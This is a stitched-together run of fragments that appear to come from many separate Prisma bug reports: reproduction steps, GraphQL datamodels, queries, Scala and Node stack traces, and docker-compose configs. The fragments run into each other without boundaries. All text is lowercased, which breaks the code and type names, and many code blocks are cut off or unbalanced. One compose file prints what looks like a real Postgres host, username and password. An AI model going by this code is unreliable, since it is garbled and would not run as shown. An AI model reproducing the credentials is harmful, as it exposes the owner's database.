the query returns `user1`
model ```graphql
type category { id: id! @id name: string! parent: category
``` query ```graphql
{ allcategories: categories { id name parent { id name } } allrootcategories: categories(where: { parent: { id_not: null } }) { id name parent { id name } } allsubcategories: categories( where: { parent: { id: "cjvf7aevp001o07986x1gitiv" } } ) { id name parent { id name } }
``` result ```json
{ "data": { "allcategories": [ { "id": "cjvf7aevp001o07986x1gitiv", "name": "drinks", "parent": null }, { "id": "cjvf7bmd9002k0798iy52dgq9", "name": "milks", "parent": { "id": "cjvf7aevp001o07986x1gitiv", "name": "drinks" } } ], "allrootcategories": [ { "id": "cjvf7aevp001o07986x1gitiv", "name": "drinks", "parent": null } ], "allsubcategories": [] }
run the migration in the main project
prisma introspect in main project
prisma introspect in some other project which has no previous knowledge of the model/database
create resolver to update model with a datetime field
persist with prisma client
observe returned model in mutation resolver:
``` updateperson: async (parent, args, context) => { const data = { ...args.data, birthdate: new date().toisostring(), }; console.log('data', data); const person = await context.prisma.updateperson({ where: { id: args.where.id, }, data, }); console.log(person); return person; }
data { name: 'katy', birthdate: '2019-05-03t21:16:17.328z' }
{ id: '5cccaa8a24aa9a000955e414', name: 'katy' }
try to deploy the prisma.yml in the following repository:
**step 1** create post type:
type post {
#the status of the record
status: status! @default(value: "draft")
#the time the record was updated
updatedat: datetime!
#the time the record was created
createdat: datetime!
#the unique identifier
id: id! @unique
``` **step 2** add title field: ```
type post {
#the status of the record
status: status! @default(value: "draft")
#the time the record was updated
updatedat: datetime!
#the time the record was created
createdat: datetime!
#the unique identifier
id: id! @unique title: string
``` **step 3** create entry for post:
{ "data": { "posts": [ { "id": "cjv27z2erh2ig08719jr3udxx", "title": "testing", "status": "draft", "createdat": "2019-04-29t10:28:15.987z", "updatedat": "2019-04-29t10:28:15.987z" } ] }
``` **step 4** rename `post` to `article` which causes a datamodel redeploy that goes through just fine:
type article @rename(oldname: "post") {
#the status of the record
status: status! @default(value: "draft")
#the time the record was updated
updatedat: datetime!
#the time the record was created
createdat: datetime!
#the unique identifier
id: id! @unique title: string
``` **step 5** trigger a manual redeploy, this time it throws a redeploy error:
type article {
#the status of the record
status: status! @default(value: "draft")
#the time the record was updated
updatedat: datetime!
#the time the record was created
createdat: datetime!
#the unique identifier
id: id! @unique title: string
"prisma_deploy_error", "errors": [{"type": "article", "field": null, "description": "you are creating a required field but there are already nodes present that would violate that constraint."}, {"type": "article", "field": null, "description": "you are creating a required field but there are already nodes present that would violate that constraint."}, {"type": "article", "field": null, "description": "you are creating a required field but there are already nodes present that would violate that constraint."}, {"type": "article", "field": null, "description": "you are creating a required field but there are already nodes present that would violate that constraint."}]
``` the weird thing being here that if i add another type or field (any stage mutation action), i am able to redeploy just fine.
load up the previous schema into a postgres database
run `prisma introspect`
generate a go client using the following schema
type example { id: uuid! @id createdat: datetime! @createdat updatedat: datetime! @updatedat enumlist: [platform!] @scalarlist(strategy: relation)
} enum platform { ios android web
try to get all the examples back with ios as a platform.
> it should probably be something like this: > ```go
> client.example(
> &prisma.exampleparams{
> where: &prisma.examplewhereinput{ > # no enumlist option here
> }).exec(ctx)
datamodel.graphql
type user { id: id! @id name: string! father: user
this is the full users list
![all-users]( 3
but when i use where argument to query, i got empty array
![where](
create a user with posts using `prisma.createuser`
validated that the mongodb contains the correct data
`prisma.users()` does not return the embedded data please see for a running example.
tell prisma to generate the go client and use datamodel.prisma (or whatever your datamodel file is called)
# defines your models, each model is mapped to the database as a table.
datamodel: datamodel.prisma # specifies the language and directory for the generated prisma client.
generate: - generator: go-client output: ../prisma-client/
add the following to datamodel.prisma
type sometype { id: uuid! @unique name: string!
generate the client code
prisma generate
attempt to compile the go client
go build -v ./...
should receive the error "prisma-client/prisma.go:281:6: undefined: uuid"
create a file datamodel.prima as following:
type configuration { _id: id! @id attachablefiles: [json]
run: `prisma generate`
the output "prisma-schema.ts" as following
type configuration { _id: id! @id attachablefiles: [json]
input configurationcreateattachablefilesinput { set: [json]
```graphql input configurationcreateinput { _id: id attachablefiles: configurationcreateattachablefilesinput
type configurationpreviousvalues { _id: id! attachablefiles: [json!]!
input configurationupdateinput { attachablefiles: configurationupdateattachablefilesinput
input configurationupdatemanymutationinput { attachablefiles: configurationupdateattachablefilesinput
i have pushed a reproduction on github here: 1
prisma generate
deploy this `datamodel.prisma`:
enum option { a b c
} type something { id: int! @id options: [option] @scalarlist(strategy:relation)
create parent with related nodes:
mutation { createsomething(data: { options: { set: [a, c] } }) { id options }
```javascript
{ "data": { "createsomething": { "id": 1, "options": [] } }
perform a `count` query on a child resource (funnel in my case) filtered by a parent resource id (shop in my case)
run `prisma deploy` without running `prisma login` or having a cloud account.
get the logs e.g
`docker-compose logs prisma`
see error that was handled, but causes a delay of 60 seconds
{"key":"error/handled","requestid":"local:cjujhrg1j003m0840b07ltqpe","payload":{"exception":"com.prisma.deploy.schema.authfailure: no \'authorization\' header provided.","query":"{\ listprojects {\ name\ }\ }","variables":"{}","code":"3015","stack_trace":"com.prisma.deploy.schema.schemabuilderimpl.verifyauthorthrow(schemabuilder.scala:317)\\\ com.prisma.deploy.schema.schemabuilderimpl.$anonfun$listprojectsfield$1(schemabuilder.scala:108)\\\ sangria.execution.resolver.resolvefield(resolver.scala:1024)\\\ sangria.execution.resolver.$anonfun$collectactionspar$1(resolver.scala:445)\\\ scala.collection.traversableonce.$anonfun$foldleft$1(traversableonce.scala:156)\\\ scala.collection.traversableonce.$anonfun$foldleft$1$adapted(traversableonce.scala:156)\\\ scala.collection.iterator.foreach(iterator.scala:937)\\\ scala.collection.iterator.foreach$(iterator.scala:937)\\\ scala.collection.abstractiterator.foreach(iterator.scala:1425)\\\ scala.collection.iterablelike.foreach(iterablelike.scala:70)\\\ scala.collection.iterablelike.foreach$(iterablelike.scala:69)\\\ scala.collection.abstractiterable.foreach(iterable.scala:54)\\\ scala.collection.traversableonce.foldleft(traversableonce.scala:156)\\\ scala.collection.traversableonce.foldleft$(traversableonce.scala:154)\\\ scala.collection.abstracttraversable.foldleft(traversable.scala:104)\\\ sangria.execution.resolver.collectactionspar(resolver.scala:439)\\\ sangria.execution.resolver.resolvefieldspar(resolver.scala:45)\\\ sangria.execution.executor.executeoperation(executor.scala:155)\\\ sangria.execution.executor.$anonfun$execute$7(executor.scala:97)\\\ scala.concurrent.future.$anonfun$flatmap$1(future.scala:303)\\\ scala.concurrent.impl.promise.$anonfun$transformwith$1(promise.scala:37)\\\ scala.concurrent.impl.callbackrunnable.run(promise.scala:60)\\\ akka.dispatch.batchingexecutor$abstractbatch.processbatch(batchingexecutor.scala:55)\\\ akka.dispatch.batchingexecutor$blockablebatch.$anonfun$run$1(batchingexecutor.scala:91)\\\ scala.runtime.java8.jfunction0$mcv$sp.apply(jfunction0$mcv$sp.java:12)\\\ scala.concurrent.blockcontext$.withblockcontext(blockcontext.scala:81)\\\ akka.dispatch.batchingexecutor$blockablebatch.run(batchingexecutor.scala:91)\\\ akka.dispatch.taskinvocation.run(abstractdispatcher.scala:40)\\\ akka.dispatch.forkjoinexecutorconfigurator$akkaforkjointask.exec(forkjoinexecutorconfigurator.scala:44)\\\ akka.dispatch.forkjoin.forkjointask.doexec(forkjointask.java:260)\\\ akka.dispatch.forkjoin.forkjoinpool$workqueue.runtask(forkjoinpool.java:1339)\\\ akka.dispatch.forkjoin.forkjoinpool.runworker(forkjoinpool.java:1979)\\\ akka.dispatch.forkjoin.forkjoinworkerthread.run(forkjoinworkerthread.java:107)","message":"no \'authorization\' header provided."}}
type organization { id: id! @id consultancy: consultancy @relation(link: inline, name: "organizationconsultancy")
} type consultancy { id: id! @id
type consultancy { id: id! @id rates: json
const { prisma } = require('./src/model/generated/prisma-client')
async function main () { const organizations = await prisma.consultancies() console.log(organizations)
} main().catch(e => console.error(e)) ```
try `prisma init` on existing mongodb with any database and observe the generated docker file
try to use `docker-compose -up -d` and the server will go into a restart loop with: `"exception in thread "main" java.lang.runtimeexception: unable to load pri sma config: com.prisma.config.invalidconfiguration: expected host to be n on-empty"`
run `prisma introspect` with a mongo db project
i'm not sure of a specific way to reproduce
as i mentioned, the exact same changes worked fine locally and on my development server just fine
i've made other deployments to the prod server that worked fine
it seems like this specific one just isn't working for some reason.
deploy a new prisma server with the following datamodel: ```
type player { id: id! @id nick: string! shirtnumber: int! personalinfo: personalinfo
} type personalinfo @embedded { name: string! lastname: string
run the following mutation ```
mutation { createplayer( data: { nick: "tom" shirtnumber: 0 personalinfo: { create: { name:"tommy" lastname:"nabo" } } } ) { id nick shirtnumber personalinfo { name lastname } }
see the error
get a simple prisma project up and running
in the prisma.yml define `secret: ${env: prisma_secret}`
create a .env file in your project with the value `prisma_secret=12345`
go into any other folder which is not the one with the `prisma.yml` in
use `prisma deploy -p [relative path to prisma.yml] -e [relative path to .env file]`
a `"a valid environment variable to satisfy the declaration [...]"` warning should appear **example**
prisma/ prisma.yml
in a folder structure like this, calling prisma deploy from inside `src/` would be:
`prisma deploy -p ../prisma/prisma.yml -e ../.env`
try to deploy the following datamodel on mysql: ```
type user { id: id! @id name: string! zebra: uuid!
try `deploy`, it rolls back
`prisma init test`
select use existing database with mongodb, enter connection uri
`docker-compose up -d`
create a new service.
replace with above schema.
do a `prisma deploy`.
in the attached image i have a set of available operations for an image field
i want to use **set** and **create** at the same time but it seems that **set** is always executed after **create**, no matter if the order is **create** and **set** or vice versa.
use in query with empty array
given the datamodel: ```graphql type user { id: id! @unique name: string! } ```
fetch a user that does not exist: ```ts const user = await prisma.user({ id: '123' }) // there is no user with the id 123! ```
observe the type of user
it is `user`.
steps to reproduce the behaviour:
create a blank mongodb database
run prisma init
choose use existing database > mongodb
fill in the connection string
see the error
run `prisma introspect`
select `mysql` in the kind of database to introspect
fill the information to connect to the database(host, username, password, port and database to be introspected)
it will generate the `datamodel.prisma` that has the problems described above.
setup an existing postgres with database name: `shop`, scheme name: `public``
run `prisma init` and fill out the details (screenshot)
notice that it asks for `schema` name as the last question but it is not printed in the generated `docker-compose.yml` file
create a data model like so:
type user { id: id! @id name: string! registeredat: datetime! @createdat
then run `prisma generate`
create some resolver where you will utilize a `createuser` method
start the project
server will give an error on `registeredat` field
setup project with below docker-compose file
version: "3"
services: prisma: image: prismagraphql/prisma:1.30-beta restart: always ports: - "4466:4466" environment: prisma_config: | port: 5432 databases: default: connector: postgres host: db port: 5432 user: postgres password: prisma migrations: true db: image: postgres:11.2 restart: always ports: - 5432:5432 environment: postgres_password: prisma volumes: - postgres_data:/var/lib/postgresql/data volumes: postgres_data: driver: local
run [prisma graphql server example]( by `npm run start`
you can access graphql ui locally
you cannot access admin ui through ` `
previously running on version 1.11.1 of prisma server.
upgraded to 1.29.1
**clone the repository:**
git clone
cd prismaexportimport/
npm install **get prisma token and copy in the index.js**
npm install npm-run
./node_modules/.bin/npm-run prisma token
copy token in index.js file **run index.js to load database**
node_modules/.bin/prisma reset -f ;node_modules/.bin/prisma delete -f;node_modules/.bin/prisma deploy;node index.js **export**
rm -f /tmp/prismalocal.zip;node_modules/.bin/prisma export --path /tmp/prismalocal.zip **import**
rm -rf .import/;node_modules/.bin/prisma reset -f ;node_modules/.bin/prisma delete -f;node_modules/.bin/prisma deploy;node_modules/.bin/prisma import --data /tmp/prismalocal.zip **result of test**
observe several traces in console (if no traces are print, redo the test from "run index.js to load database") "failure inserting into relationtable _codetoobj with ids stringidgcvalue(cjtfka7a2oglf0879ofll120t) and stringidgcvalue(cjtfkcdgypylu0879k2k9a994)
cause: duplicate key value violates unique constraint \\"_codetoobj_ab_unique\\"\ detail: key (\\"a\\", \\"b\\")=(cjtfka74nogi80879crln0530, cjtfkas5povi90879pqlt43c7) already exists."
make the following prisma.yml file
# specifies the http endpoint of your prisma api.
endpoint: # defines your models, each model is mapped to the database as a collection.
datamodel: datamodel.prisma
run `prisma deploy
`prisma init hello-world`
here's what i input: ```
? set up a new prisma server or deploy to an existing server? use existing database
? what kind of database do you want to deploy to? postgresql
? does your database contain existing data? yes
? enter database host: localhost
? enter database port: 5432
? enter database user: ryan
? enter database password: hunter2
? enter database name (the database includes the schema)
? use ssl? no
? please select the schema you want to introspect: public
compose a prisma server version with >= 1.28.3 version.
create a sample table with a timestampz field on postgresql.
try to deploy the server
`error` ````
java.lang.runtimeexception: encountered unknown sql type timestamptz with column createdat
introspectedcolumn(createdat,timestamptz,null,false)
at scala.sys.package$.error(package.scala:26)
at com.prisma.deploy.connector.jdbc.databaseinspectorbase.$anonfun$gettable$6(databaseinspectorbase.scala:57)
at scala.option.getorelse(option.scala:121)
at com.prisma.deploy.connector.jdbc.databaseinspectorbase.$anonfun$gettable$5(databaseinspectorbase.scala:57)
at scala.collection.traversablelike.$anonfun$map$1(traversablelike.scala:233)
at scala.collection.iterator.foreach(iterator.scala:937)
at scala.collection.iterator.foreach$(iterator.scala:937)
at scala.collection.abstractiterator.foreach(iterator.scala:1425)
at scala.collection.iterablelike.foreach(iterablelike.scala:70)
at scala.collection.iterablelike.foreach$(iterablelike.scala:69)
at scala.collection.abstractiterable.foreach(iterable.scala:54)
at scala.collection.traversablelike.map(traversablelike.scala:233)
at scala.collection.traversablelike.map$(traversablelike.scala:226)
at scala.collection.abstracttraversable.map(traversable.scala:104)
at com.prisma.deploy.connector.jdbc.databaseinspectorbase.$anonfun$gettable$4(databaseinspectorbase.scala:54)
at slick.dbio.dbioaction.$anonfun$map$1(dbioaction.scala:43)
at slick.basic.basicbackend$databasedef.$anonfun$runincontextinline$1(basicbackend.scala:171)
at scala.concurrent.future.$anonfun$flatmap$1(future.scala:303)
at scala.concurrent.impl.promise.$anonfun$transformwith$1(promise.scala:37)
at scala.concurrent.impl.callbackrunnable.run(promise.scala:60)
at akka.dispatch.batchingexecutor$abstractbatch.processbatch(batchingexecutor.scala:55)
at akka.dispatch.batchingexecutor$blockablebatch.$anonfun$run$1(batchingexecutor.scala:91)
at scala.runtime.java8.jfunction0$mcv$sp.apply(jfunction0$mcv$sp.java:12)
at scala.concurrent.blockcontext$.withblockcontext(blockcontext.scala:81)
at akka.dispatch.batchingexecutor$blockablebatch.run(batchingexecutor.scala:91)
at akka.dispatch.taskinvocation.run(abstractdispatcher.scala:40)
at akka.dispatch.forkjoinexecutorconfigurator$akkaforkjointask.exec(forkjoinexecutorconfigurator.scala:44)
at akka.dispatch.forkjoin.forkjointask.doexec(forkjointask.java:260)
at akka.dispatch.forkjoin.forkjoinpool$workqueue.runtask(forkjoinpool.java:1339)
at akka.dispatch.forkjoin.forkjoinpool.runworker(forkjoinpool.java:1979)
at akka.dispatch.forkjoin.forkjoinworkerthread.run(forkjoinworkerthread.java:107)
sorry, it's only on k8s structure for now.
now i'm trying to repro on docker-compose, but i still have not been able to it.
here is the output of client with `debug: true` ```
query ($where: userwhereuniqueinput!) { user(where: $where) { home { place { work { job } } } }
} variables:
{"where":{"id":"cjt73k1j0008n0729enq8vwbz"}}
(node:59004) unhandledpromiserejectionwarning: error: field 'place' of type 'string' must not have a sub selection
(lin$ 4, column 7):
attempt to deploy `prisma deploy` and i get the following error message: ``` environment typeerror: cannot read property 'serverinfo' of undefined environment at cluster.<anonymous> (/users/calummoore/.nvm/versions/node/v10.13.0/lib/node_modules/prisma/node_modules/prisma-yml/src/cluster.ts:227:19) environment at step (/users/calummoore/.nvm/versions/node/v10.13.0/lib/node_modules/prisma/node_modules/prisma-yml/dist/cluster.js:32:23) environment at object.next (/users/calummoore/.nvm/versions/node/v10.13.0/lib/node_modules/prisma/node_modules/prisma-yml/dist/cluster.js:13:53) environment at fulfilled (/users/calummoore/.nvm/versions/node/v10.13.0/lib/node_modules/prisma/node_modules/prisma-yml/dist/cluster.js:4:58) environment at process._tickcallback (internal/process/next_tick.js:68:7) +0ms
error: could not connect to server at
please check if your server is running
at deploy.<anonymous> (/users/calummoore/.nvm/versions/node/v10.13.0/lib/node_modules/prisma/node_modules/prisma-cli-core/src/commands/deploy/deploy.ts:128:13) at step (/users/calummoore/.nvm/versions/node/v10.13.0/lib/node_modules/prisma/node_modules/prisma-cli-core/dist/commands/deploy/deploy.js:45:23) at object.next (/users/calummoore/.nvm/versions/node/v10.13.0/lib/node_modules/prisma/node_modules/prisma-cli-core/dist/commands/deploy/deploy.js:26:53) at fulfilled (/users/calummoore/.nvm/versions/node/v10.13.0/lib/node_modules/prisma/node_modules/prisma-cli-core/dist/commands/deploy/deploy.js:17:58) at process._tickcallback (internal/process/next_tick.js:68:7)
exiting with code: 1
``` docker config is:
image: prismagraphql/prisma:1.28
environment: - name: prisma_config value: | port: 4466 databases: default: connector: postgres host: otto.db.elephantsql.com port: 5432 user: orqidund database: orqidund password: ********* migrations: true
follow the [get started]( tutorial 1
set up prisma
change datamodel * [step 4 - regenerate your prisma client]( #regenerate-your-prisma-client) after adding `prisma generate` as a post-deploy hook here is what my `prisma.yml` looks like...
![screen shot 2019-03-11 at 1 28 20 am]( below is the output upon executing `prisma deploy`...
![screen shot 2019-03-11 at 1 25 06 am](
use a mongodb atlas uri
deploy docker
docker container will continuously reset
more details from multiple users here:
create model, e.g
create enumeration "categories" and assign 1 value
create "categories" enum field and allow it having multiple values and is required
create an entry that uses the 1 enum value
rename enum field to "category"
change enum field from list to non-list
querying for the following throws the above mentioned error in prisma:
coursesconnection { edges { node { category __typename } } }
my datamodel looks like this: ```
enum permission { admin user permissionupdate
} type user { id: id! @id firstname: string! lastname: string! username: string @unique email: string! @unique password: string! posts: [post!]! @relation(link: inline) following: [user!]! @relation(name: "following", link: inline) followers: [user!]! @relation(name: "followers", link: inline) resettoken: string resettokenexpiry: string permissions: [permission!]! createdat: datetime! @createdat updatedat: datetime! @updatedat
} type post { id: id! @id caption: string image: string largeimage: string published: boolean @default(value: false) author: user! comments: [comment!]! createdat: datetime! @createdat updatedat: datetime! @updatedat
} type comment @embedded { text: string! writtenby: user!
``` i have a `createpost` resolver to create a new `post` that looks like this: ``` createpost(_, args, ctx, info) { if (!ctx.request.userid) { throw new error('you must be logged in to do that!'); } return ctx.prisma.createpost({ author: { connect: { id: ctx.request.userid } }, ...args }); }
``` which just checks someone is currently logged in and creates a `post` with the logged in user being the `author` i can see in mongo compass that everything is being created as expected
post collection:
<img width="644" alt="screenshot 2019-03-07 at 10 03 42" src=" "> user collection:
<img width="563" alt="screenshot 2019-03-07 at 10 03 51" src=" "> however i get the error `cannot return null for non-nullable field user.posts.` when using this query: ```
{ users { firstname posts { id } }
``` **expected behaviour**
what i expect to get is the `user` data plus the `post` data from the query **versions**
`prisma-client-lib/1.27.3`
`prisma cli/1.26.4`
re-launch `prisma introspect` over a postgresql object which includes a 1-n relation.
used prisma's heroku deployment
upgraded the container from 1.26.4 to 1.27.0 and 1.27.1
ran any query and get the above error
rolling back to 1.26.4 fixes all errors.
clone prisma example with docker & postgres:
follow the steps in the readme to get server and database up and running
run `npm run start` once to populate the db with some posts
copy the first id return from allposts query
modify the allposts query in `src/script.js` to use `prisma.postsconnection` instead of `prisma.posts`, and add the `after` argument with the just copied id
const allposts = await prisma.postsconnection({ where: { published: true }, first: 1, after: "cjsj52wxt000s0813o7m3wtpx" });
run `npm run start` again, this time throwing the internal server error.
execute `prisma deploy`
run prisma init abc
cancel it in between
example `datamodel.prisma`:
type user { id: id! @unique credit: int! @default(value: 0) createdat: datetime! updatedat: datetime!
} type call { id: id! @unique source: user! @relation(name: "usercalls") guests: [user!]! @relation(name: "usercallsreceived") createdat: datetime! updatedat: datetime! endedat: datetime
example `prisma.yml`:
endpoint: " "
datamodel: datamodel.prisma
generate: - generator: go-client output: ./generated/prisma-client/
create a new golang project
run `prisma deploy`
run `prisma generate`
try to run the following with prisma generated packages imported:
u := getcurrentuser(ctx)
users, err := prismaclient.call(prisma.callwhereuniqueinput{id: &callid}).guests(&prisma.guestsparamsexec{where: &prisma.userwhereinput{id: &u.id}}).exec(ctx)
if err != nil { log.fatal(err) return
setup existing database with postgres to step 4
run `docker-compose up -d`
check container logs
unzip the schema and deploy a new service on your prisma instance, e.g
`core_revision=1 core_prisma_host=localhost npx prisma deploy`
import the export via `core_revision=1 core_prisma_host=localhost npx prisma import --data export.zip`
visit your prisma instance and query `{ products { pid, variations { id, vid, images } } }`
inspect the result, the first 30 or so products should contain variations with images but all remaining variations and their `images` property hold an empty list
unzip the `export.zip` on your local machine
inspect the ids of the variations **without** images and find them in the unzipped export folder, they should contain images (e.g
not be an empty list).
login with the cli
enter `prisma init hello-world`
select using existing database
select postgres
select db contains data: no
enter host, port, user, password, and database
select use ssl `y`
@pantharshit00 created this repo for another issue
it's the same structure
go to this repo and clone it, then compose and deploy it, and then in some postgresql ide execute these 3 inserts
-- customer
insert into billing."customer"
(code, "name", "createdat", "updatedat")
values('tst','test', clock_timestamp(), clock_timestamp()); -- contract
insert into billing."contract"
(code, enabled, "activationdatetime", "minimumfee", "looktobook", "customerid", "createdat", "updatedat")
values('b2b', false, clock_timestamp(), 0, 0, 1, clock_timestamp() , clock_timestamp()); -- item
insert into billing."item"
(enabled, "specificfreetrialdays", "createdat", "updatedat", "contractid")
values(false, 40, clock_timestamp(),clock_timestamp(), 1);
send a request in playground ````
query { contracts { id items { id enabled } }
there is any item in the contract
![image]( but if you go to the ddbb ide you can see the expected result with an inner join
![image](
connect to existing mongodb database with prisma server
set up the new service and deploy it on prisma server.
create a schema with implicit relations between multiple types that start with lowercase letters.
run `prisma deploy`.
wihout interactive mode: > $ prisma introspect ! duplicated mapping key at line 12, column 1: ! datamodel: datamodel-15495479671 ..
with interactive: > $ prisma introspect -i
? what kind of database do you want to introspect? postgresql
? enter database host localhost
? enter database port 5432
? enter database user postgres
? enter database password xxxxxxx
? enter database name (the database includes the schema) postgres
? use ssl? no
? enter name of existing schema (e.g
default$default) billing
? please select the schema you want to introspect billing ! must provide source
received: undefined
deploy a new prisma server with the following datamodel: ```graphql
type mealplan { id: id! @id mealplanuser: mealplanuser @relation(link: inline) delivery: delivery menuitem: menuitem @relation(link: inline) subtotal: int tax: int total: int paymentmethod: paymentmethod isarchived: boolean isdelivered: boolean createddate: datetime @createdat
type mealplanuser { id: id! @id firstname: string lastname: string email: string! @unique mobilenumber: string avatar: string
type delivery @embedded { locationname: string streetaddress: string city: string state: string phone: string email: string! deliverby: datetime @createdat
type menuitem { id: id! @id name: string description: string noningredients: [noningredients] image: [menuimage] # addons: [addons] @relation(link: inline) # nutritionalfacts: [nutritionalfacts] cost: int
type noningredients @embedded { name: string amount: string
type menuimage @embedded { name: string url: string
type paymentmethod @embedded { paymenttype: string amountpaid: string transactionid: string
run the following mutation
mutation { createmealplan( data: { subtotal: 123 tax: 123 total: 1234 isarchived: false isdelivered: false mealplanuser: { create: { firstname: "pantharshit" lastname: "asdf" email: "asdf" mobilenumber: "asdf" avatar: "ads" } } menuitem: { create: { name: "asd" description: "asd" noningredients: { create: [{ name: "asd", amount: "asd" }] } image: { create: [{ name: "adsw", url: "asd" }] } } } paymentmethod: { create: { paymenttype: "asd", amountpaid: "asd", transactionid: "asd" } } } ) { id menuitem{ image{ name url } } }
see the error
create datamodel
run prisma generate
create resolver with ctx.area({ id }).accesses()
throws error
create resolver with ctx.area({ id }).accesses
bootstrap a simple prisma project using the cli(choose us demo servers)
add a field `test: int` to the datamodel
run prisma deploy
change the type to float and rerun the deploy
try to insert some data with the `createuser` mutation
create postgres tables: account/user: ```
create table public.account
( id integer not null default nextval(\'users_id_seq\'::regclass), username character varying(255) collate pg_catalog."default" not null, email character varying(255) collate pg_catalog."default" not null, constraint users_pkey primary key (id), constraint users_username_email_unique unique (username, email) )
``` company:
create table public.company
( id integer not null default nextval(\'companies_id_seq\'::regclass), name character varying(255) collate pg_catalog."default", "userid" integer, constraint companies_pkey primary key (id),
, constraint companies_userid_foreign foreign key ("userid") references public.account (id) match simple on update no action on delete cascade
``` store: ```
create table public.store
( id integer not null default nextval(\'stores_id_seq\'::regclass), "storeid" character varying(255) collate pg_catalog."default" not null, "companyid" integer, "userid" integer, constraint stores_pkey primary key (id), constraint store_userid_foreign foreign key ("userid") references public.account (id) match simple on update no action on delete no action, constraint stores_companyid_foreign foreign key ("companyid") references public.company (id) match simple on update no action on delete cascade
run `prisma introspect` to create your datamodel, deploy and generate your datamodel
create a user, and use the mutation above to attempt to create a company and associate it with the user
create a one to many relationship that is not required on the one side
create a relationship with both and one that doesn't have a many relationship
go to '
click on 'home page' or 'repository' link
in the prisma datamodel, create a type that has a relation to another field
generate the go client and graphql schema in the generator section of prisma.yml
use method chaining inside a custom resolver
get an obscure error (see screenshots)
update to 1.25
perform a `prisma deploy`
just run the command `prisma generate`
the following schema does not work: ```
type user { id: id! @id email: string! password: string! account: account @relation(name: "usersbyaccount", link: inline, ondelete: set_null)
} type account { id: id! @id name: string! users: [user!]! @relation(name: "usersbyaccount") address: address
} type address @embedded { street: string city: string country: string
``` while the following schema works: ```
type user { id: id! @id email: string! password: string! account: account @relation(name: "usersbyaccount")
} type account { id: id! @id name: string! users: [user!]! @relation(name: "usersbyaccount", link: inline, ondelete: set_null) address: address
} type address @embedded { street: string city: string country: string
in prisma graphql, run the following mutation ```
mutation { createuser( data: { email: "me@domain.com" password: "hashedvalue" account: { create: { name: "company a" address: { create: { street: "1 fake street" city: "lausanne" country: "switzerland" } } } } } ) { id email password }
query the following data to confirm the error with the 1st schema, while the second one works properly: ```
query{ users{ email account{ name address{ street } } }
login on cli via `prisma login` 2
deploy via `prisma deploy -e .env.staging`
prints this error message
```{ "data": { "addproject": null }, "errors": [ { "locations": [ { "line": 2, "column": 9 } ], "path": [ "addproject" ], "code": 3015, "message": "authentication token is invalid: token can\'t be decoded: invalid signature for this token or wrong algorithm.", "requestid": "alpha-curated_curated:cjqzjh334007c0867hfzc6ar7" } ], "status": 200
create a new "azure cosmos db for mongodb api"
run prisma init hello-world
choose existing db -> no data
add connection string provided by azure (mongodb://dbname:secret==@dbname.documents.azure.com:10255/?ssl=true&replicaset=globaldb"
just try to generate a client from above datamodel
create a new prisma service with a local mongodb using the `prisma init` wizard
start the prisma server with the mongodb by running `docker-compose up -d`
deploy the prisma api with the default `user` type by running `prisma deploy`
create a new `user` with the `createuser` mutation in the playground
rename `user` to `person` in your datamodel
run `prisma deploy` the cli outputs: ```
deploying service `default` to stage `default` to server `local` 51ms warnings: user ! you already have nodes for this model
this change will result in data loss
if you want to ignore the warnings, please deploy with the --force flag: $ prisma deploy --force
read more about deployment warnings here:
``` when using prisma with mongodb, prisma will never delete anything during a migration
so that error message is not accurate.
create a datamodel with a one-to-many relation field, mark the field as required
deploy to prisma cloud
open prisma playground
open type definition for type that contains the one-to-many relation field
i'm using a postgres db on heroku looking like this: ```sql
-- sequence
create sequence if not exists "public"."post_id_seq"; -- table definition
create table "public"."post" ( "id" int4 not null default nextval(\'post_id_seq\'::regclass), "title" varchar not null, "author" int4 not null, constraint "post_author_fkey" foreign key ("author") references "public"."user"("id") on delete cascade on update cascade, primary key ("id")
-- sequence
create sequence if not exists "public"."user_id_seq"; -- table definition
create table "public"."user" ( "id" int4 not null default nextval(\'user_id_seq\'::regclass), "name" varchar not null, "email" varchar, primary key ("id")
``` now i'm running `prisma init`: ![image]( the generated datamodel looks like this: ```graphql
type user { id: id! @unique name: string!
``` the generated docker compose file looks like this: ```yml
version: '3'
services: prisma: image: prismagraphql/prisma:1.23 restart: always ports: - "4466:4466" environment: prisma_config: | port: 4466 # uncomment the next line and provide the env var prisma_management_api_secret=my-secret to activate cluster security # managementapisecret: my-secret databases: default: connector: postgres host: ec2-54-235-169-191.compute-1.amazonaws.com database: d60c67pi42ha6 schema: public user: nwbmapwrrgqtcu password: f9c5c7921be8fc3ac1a8323bf6aa48fd6645852eebcee7dbaf9d86e4f063c8cc rawaccess: true port: \'5432\' migrations: true
in the command line, run `yarn prisma deploy`
select `demo server`
click `grant permission` button `network error: unexpected token < in json at position 0` in upper right corner
i unfortunately don't have time to create a small reproduction right now, but this is what i am doing in my app: ```
type user { id: string
} type note { users: [user!]!
} mutation { updatenote ( data: { users: { connect:{ id: jiakymv3pq060b73d4oz056p } } }, where: { id: jqh6imbr22xp0831r8581qu4" } ) { id }
use `prisma init` with use existing database option
setup postgres
check docker logs they will show `org.postgresql.util.psqlexception: fatal: permission denied for database "postgres" detail: user does not have connect privilege.` or 1
deploy to prisma cloud
the server will report as not reachable
given a list of users with uuids
disconnect from campaign entity
ctx.prisma.updatecampaign({ data: { campaignleads: { disconnect: [ { id: "1066c26c-b76b-4b26-afb9-2e5160a486b3", }, { id: "1571c0ec-06dc-4ec7-a5ba-2a37dc96d28d", }, ], }, }, where: { id, }, });
***datamodel.prisma***
type user { id: id! @unique name: string
``` in javascript code, i'm trying to retrieve all users that have a `null` name:
const userswithnoname = await prisma .users({ where: { name: null } })
``` this doesn't return any records even if there are some records that have a `null` name if i directly use a graphql query to perform the same task, however, i am getting the expected records:
``` const query = ` query ($nullvalue: string){ users(where:{ name: $nullvalue }) { id } } ` const variables = { nullvalue: null } const { users } = await prisma.$graphql(query, variables)
follow all the steps in the documentation.
here: #start-the-graphql-server $ go run ./server
\\# hello-world/server
server/resolver.go:68:4: unknown field \'author\' in struct literal of type "hello-world/generated/prisma-client".postwhereinput
steps to reproduce the behavior and screenshot:
![image](
`prisma introspect` an existing database
this correctly identifies columns with special characters and inserts it into the datamodel.
`prisma deploy` fails with `error: syntax error while parsing graphql query
invalid input` when special characters are present in the datamodel
in this case, `#`.
check out [this repo]( and run
make build-dev
make run-dev
after some biolerplate, you'll see a complaint `a unique constraint would be violated on user
details: field name = email, location: [object object], path: user1`
the full error message (showing the failure in both postgres and prisma levels) are shown here:
\x1b[36mpostgres_1 |\x1b[0m 2018-12-23 22:37:31.469 utc [70] error: duplicate key value violates unique constraint "default$default.user.email._unique"
